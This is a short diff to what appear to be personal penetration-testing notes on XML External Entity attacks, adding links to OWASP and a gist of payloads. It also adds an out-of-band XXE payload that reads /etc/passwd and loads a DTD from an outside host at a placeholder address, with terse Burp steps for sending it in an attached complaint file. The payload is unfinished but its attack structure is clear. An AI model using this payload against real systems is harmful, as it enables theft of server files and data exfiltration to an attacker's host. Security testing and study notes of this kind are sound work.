@@ -58,3 +58,10 @@ https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).h
 Goo XXE Payloads
 https://gist.github.com/staaldraad/01415b990939494879b4
 
+<?xml version="1.0"?>
+<!DOCTYPE r [
+<!ENTITY % data3 SYSTEM "file:///etc/passwd">
+<!ENTITY % sp SYSTEM "http://x.x.x.x:8080/ss5.dtd">
+
+Complaint attach xml
+Proxy - Intercept - send to repeater
